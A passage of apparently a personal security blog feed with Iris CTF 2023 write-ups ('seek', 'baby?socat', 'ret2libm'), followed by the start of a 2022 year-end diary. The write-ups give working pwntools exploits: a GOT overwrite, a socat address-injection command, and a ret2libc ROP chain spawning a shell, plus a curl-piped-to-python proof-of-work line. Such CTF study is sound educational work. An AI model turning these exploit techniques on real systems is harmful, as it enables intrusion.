Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Letâ€™s see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Letâ€™s overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - baby?socat</title>
      <link href="/230109-irisctf2023-babysocat/"/>
      <url>/230109-irisctf2023-babysocat/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>22 Solves (2.1% of users)<br>478 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>love sockets and cats and socat and ls</p><p>Socat version on remote is 1.7.4.1<br><code>nc socat.chal.irisc.tf 10000</code></p><p>By: sera</p><p>The biggest clue to solving this problem is the SOCAT VERSION for intended solution.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ chal.c</span><br><span class="line">â””â”€â”€ run.sh</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>X</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Give me your command: &quot;</span></span><br><span class="line"><span class="built_in">read</span> -e -r input</span><br><span class="line">input=<span class="string">&quot;exec:./chal ls <span class="variable">$input</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">&quot;fakeflg&#123;REDACTED&#125;&quot;</span> socat - <span class="string">&quot;<span class="variable">$input</span>&quot;</span> 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p>The <code>socat</code> is set up execute a <code>chal</code> binary with the parameters <code>ls</code> then the <code>input</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(setenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NO!&quot;</span>, <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    execvp(argv[<span class="number">1</span>], argv+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The source code of chal binary is just sets the <code>FLAG</code> env empty.</p><h2 id="Vulnerability-amp-Solve-1-intended"><a href="#Vulnerability-amp-Solve-1-intended" class="headerlink" title="Vulnerability &amp; Solve 1 (intended)"></a>Vulnerability &amp; Solve 1 (intended)</h2><p>It would be good to refer to the public writeup for this part. For reference, the change log in the public writeup can be found at the <a href="https://pkgsrc.se/net/socat">pkgsrc.se&#x2F;net&#x2F;socat</a>.</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md</a></li></ul><p>Finally, The <code>setenv(&quot;FLAG&quot;, &quot;NO!&quot;, 1)</code> is to help prevent any unintended solutions. It retains environment variable only during execution. It would be like I can print env with <code>ls</code>, but I canâ€™t. I concentrated this part but it was a waste of time. I havenâ€™t been able to solve this challenge.</p><h2 id="Solve-2-unintended"><a href="#Solve-2-unintended" class="headerlink" title="Solve 2 (unintended)"></a>Solve 2 (unintended)</h2><p>Looking at the Discord, there were many people who solved the challenge in this way. (I think it would be okay to use this solution for later. whenever..)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">socat -d -d - TCP4:www.example.com:80</span><br></pre></td></tr></table></figure><p>As for the solution, here it is: <code>!!system:env</code></p><p>The <code>system</code> is type of socat address. If you use <code>!!</code>, two single addresses specifications can be combined to form a dual type address for one bytestream.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM:&lt;shell-command&gt;</span><br><span class="line">Forks a sub process that establishes communication with its parent process and invokes the specified program with system() . Please note that &lt;shell-command&gt; [string] must not contain &#x27;,&#x27; or &quot;!!&quot;, and that shell meta characters may have to be protected. After successful program start, socat writes data to stdin of the process and reads from its stdout.</span><br></pre></td></tr></table></figure><p>You can find another type of socat address.:</p><ul><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_TYPES">www.dest-unreach.org/socat/doc/socat.html</a></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://copyconstruct.medium.com/socat-29453e9fc8a6">https://copyconstruct.medium.com/socat-29453e9fc8a6</a></li><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_SPECIFICATIONS">http://www.dest-unreach.org/socat/doc/socat.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - ret2libm (simple BOF)</title>
      <link href="/230109-irisctf2023-ret2libm/"/>
      <url>/230109-irisctf2023-ret2libm/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>49 Solves (4.7% of users)<br>392 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I need to make a pwn? Letâ€™s go with that standard warmup rop thingâ€¦ what was itâ€¦ ret2libm?<br><code>nc ret2libm.chal.irisc.tf 10001</code></p><p>Hint!<br>The challenge server may be acting up. If your solution works locally and on the docker but not on remote, please open a ticket!</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ chal</span><br><span class="line">â”œâ”€â”€ chal.c</span><br><span class="line">â”œâ”€â”€ libc-2.27.so</span><br><span class="line">â”œâ”€â”€ libm-2.27.so</span><br><span class="line">â””â”€â”€ Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c6fac9007a0e13f2ca1978d85d974afb7fd03d9, not stripped</span><br></pre></td></tr></table></figure><p>This challenge use a <code>libc-2.27.so</code> So enviroment seems to Ubuntu 18.04 that different to me. That enviroment is different from mine, I downloaded <code>ld</code> file with docker. And then I patched it. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch ret2libm]$ ldd chal</span><br><span class="line">linux-vdso.so.1 (0x00007fff13dc7000)</span><br><span class="line">./libm-2.27.so (0x00007fbe43800000)</span><br><span class="line">./libc-2.27.so (0x00007fbe43400000)</span><br><span class="line">./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbe43e9a000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -lm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> yours[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check out my pecs: %p\n&quot;</span>, <span class="built_in">fabs</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How about yours? &quot;</span>);</span><br><span class="line">    gets(yours);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see how they stack up.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The challenge leaks the pointer to a <code>fabs</code> in libm.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The <code>gets()</code> functions cause to <code>Buffer overflow</code>. We can change the <code>RIP</code>.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Just do it!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;, env = &#123;</span></span><br><span class="line">    <span class="comment"># &#x27;LD_PRELOAD&#x27; : &#x27;./libm-2.27.so&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2libm.chal.irisc.tf&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libm = ELF(<span class="string">&#x27;./libm-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;pecs:&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libm_base = leak - libm.sym[<span class="string">&#x27;fabsf64&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libm_base))</span><br><span class="line"></span><br><span class="line">libc.address = libm_base - <span class="number">0x3f1000</span> </span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x02164f) # pop rdi</span></span><br><span class="line"><span class="comment"># payload += p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span></span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x8aa) # ret</span></span><br><span class="line"><span class="comment"># payload += p64(libc.sym[&#x27;system&#x27;])`</span></span><br><span class="line"></span><br><span class="line">payload += p64(libm_base + <span class="number">0xbc37</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libm_base + <span class="number">0x2a2</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;yours?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><p>And In this challenge, We can use onegadget. :-)</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;oh_its_ret2libc_anyway&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022-12-31 Diary (2022 Memoir)</title>
      <link href="/221231-diary/"/>
      <url>/221231-diary/</url>
      
        <content type="html"><![CDATA[<p>Today is 2022â€™s last day. So, Iâ€™m writing a 2022 Memoir. :-D</p><h2 id="Graduated-University"><a href="#Graduated-University" class="headerlink" title="Graduated University"></a>Graduated University</h2><p>After completing BoB in the first half of the year, I returned to University. At the same time, I joined the company, so I didnâ€™t go to University, but I devoted time to graduation assignments. I tended to go to University diligently during the past period. I always did my best to do my assignments or not be absentâ€¦ etc. Going to University while working at the same time was harder than I thought. The hardest thing was to do graduation assignments. Still, thanks to the team members, I was able to finish my graduation assignments well and received the highest grade of A+. Iâ€™m very satisfied.</p><p>The content of graduation assignment is as follows. We proposed a market and developed a system to trade ultra-light food for single students or dormitory students attending our University. My role in the project was DB development and backend development. We use the Node JS for development.</p><p>I was able to successfully achieve my graduation in August by successfully obtaining the license(ì •ë³´ì²˜ë¦¬ê¸°ì‚¬) for graduation within the deadline. Iâ€™m so glad. In fact, around the time I graduated, I formed a team as a University student and participated in the offline CTF. I placed on 6th in 2022 Hektheon Sejong 1st CTF. My role was Pwnable. I also worked hard to solve the problem, but in the end, I think I won the award thanks to other people.</p><h2 id="Joining-and-Leaving-the-company"><a href="#Joining-and-Leaving-the-company" class="headerlink" title="Joining and Leaving the company"></a>Joining and Leaving the company</h2><p>I joined an offensive research company in March of this year, a month before completing BoB. It was my first social life outside of University and BoB. I originally intended to organize my life in Seoul after completing BoB and go to the school dormitory to rest. However, the company gave me a good opportunity of assignments and interviews, so I worked hard and passed and joined the company. So, I remember canceling my University dormitory in a hurry. I thought attending a company was a much better opportunity for me than going back to University. I joined the company with such a hopeful mindset, but resigned in September.</p><p>There are many reasons for leaving the company, but one of them is to travel in search of a dream.(?) I felt cramped while going to the company, and even though I only went to the company for a short period of time, I didnâ€™t think it was helpful. It has been about 3 months since I left. I am so happy now. I donâ€™t think in a hurry and have time to spare, so Iâ€™m working on the computer with a more enjoyable mind than before. I really like myself for having this mindset.</p><h2 id="Demon-Team"><a href="#Demon-Team" class="headerlink" title="Demon Team"></a>Demon Team</h2><p>Demon team did a lot of things this year. Next year, I want to do a lot of useful and fresh things.</p><ol><li>Although the team name was not listed in the article, We participated in the CDDC 2022 